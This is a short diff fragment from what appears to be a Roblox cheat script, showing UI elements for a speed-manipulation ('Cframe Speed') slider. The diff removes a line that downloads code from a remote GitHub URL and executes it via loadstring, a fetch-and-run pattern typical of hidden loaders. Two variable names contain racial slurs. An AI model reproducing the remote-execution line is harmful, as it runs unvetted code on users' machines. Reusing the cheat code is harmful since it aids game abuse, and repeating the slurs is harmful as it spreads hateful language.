@@ -816,8 +816,6 @@ local farzadniggahaterxd2 = CframexdSection:AddTextbox({   -- fixthe KeyCode ...
     end
 })
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxprogamer2141274/ui/main/test5"))()
-
 local nigga123xdlock2 = CframexdSection:AddSlider({
     Name = "Cframe Speed",
     Flag = "CframexdSection_CframeSpeed",
